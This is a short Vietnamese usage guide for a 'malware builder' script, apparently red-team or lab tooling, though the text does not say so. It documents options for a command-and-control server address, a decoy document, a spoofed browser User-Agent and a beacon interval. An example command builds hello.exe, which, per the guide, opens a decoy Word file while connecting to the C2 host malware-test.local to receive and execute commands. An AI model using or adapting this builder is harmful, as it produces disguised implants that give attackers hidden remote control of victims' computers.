# Hướng dẫn sử dụng malware builder

Malware builder có những param sau:
```
--url: url của C2
--uri: đường dẫn uri. Mặc định là "/admin/edit/upload_image.aspx"
--port: Port malware sẽ connect tới C2. Mặc định là port 80
--decoy: Decoy document. Document sẽ mở ra khi malware được thực thi
--useragent: User-Agent malware dùng để connect tới C2. Mặc định là "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36"
--sleep: Thời gian sleep của malware. Đây là thời gian delay của malware giữa các lần connect tới server. Mặc định là 10s
--output: File exe output
```

VD sử dụng
`builder.py --url malware-test.local --decoy ./bins/cat.docx --output hello.exe`

Command sau sẽ build file hello.exe. Khi chạy file này sẽ mở file decoy doc `cat.docx` và connect tới C2 `malware-test.local` để nhận và thực thi command